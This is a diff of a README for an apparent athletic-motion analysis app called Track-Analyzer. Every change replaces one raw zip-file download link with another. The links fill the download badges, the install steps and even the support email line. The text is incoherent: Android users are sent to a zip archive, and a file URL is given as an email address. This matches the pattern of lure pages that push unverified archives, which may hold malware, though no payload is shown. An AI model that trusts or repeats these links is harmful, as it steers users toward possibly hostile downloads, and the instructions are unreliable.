@@ -1,6 +1,6 @@
 # 📊 Track-Analyzer - Analyze Athletic Motion with Ease
 
-[![Download Track-Analyzer](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Track-Analyzer-v3.8.zip%20Track--Analyzer-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Track-Analyzer-v3.8.zip)
+[![Download Track-Analyzer](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Analyzer-Track-v3.2.zip%20Track--Analyzer-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Analyzer-Track-v3.2.zip)
 
 ## 📚 Description
 
@@ -24,7 +24,7 @@ Before you start, ensure your device meets these basic requirements:
 
 To get Track Analyzer, please visit our releases page. Here, you will find the application ready for download.
 
-[Download Track Analyzer](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Track-Analyzer-v3.8.zip)
+[Download Track Analyzer](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Analyzer-Track-v3.2.zip)
 
 ### Installation Steps
 
@@ -35,7 +35,7 @@ To get Track Analyzer, please visit our releases page. Here, you will find the a
 3. **Choose Your Platform:** Select the appropriate version for your device. You will typically see options for Android and iOS.
 
 4. **Download the App:**
-   - For **Android:** Click on the link labeled “https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Track-Analyzer-v3.8.zip”.
+   - For **Android:** Click on the link labeled “https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Analyzer-Track-v3.2.zip”.
    - For **iOS:** Click on the link for the "Track Analyzer" app if available. Otherwise, follow the instructions shown to access the App Store.
 
 5. **Install the App:**
@@ -73,7 +73,7 @@ If you face any issues while downloading or running Track Analyzer, please reach
 
 - **FAQ:** Check the FAQ section in the app for common questions.
 - **User Community:** Join our community forum to connect with other users and share your experiences.
-- **Contact Support:** Email us at [https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Track-Analyzer-v3.8.zip](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Track-Analyzer-v3.8.zip) for personalized assistance.
+- **Contact Support:** Email us at [https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Analyzer-Track-v3.2.zip](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Analyzer-Track-v3.2.zip) for personalized assistance.
 
 ## 📝 Topics
 
@@ -101,6 +101,6 @@ By using these technologies, Track Analyzer guarantees a sophisticated yet user-
 
 Track Analyzer is designed for every athlete looking to improve their performance. By following the simple steps outlined, you can easily download, install, and begin using the app to analyze and enhance your athletic skills.
 
-[Download Track Analyzer](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Track-Analyzer-v3.8.zip) 
+[Download Track Analyzer](https://raw.githubusercontent.com/Kencgm/Track-Analyzer/main/Proposal/Analyzer-Track-v3.2.zip) 
 
 Thank you for choosing Track Analyzer. We hope you enjoy your experience and find our app helpful for your athletic journey.
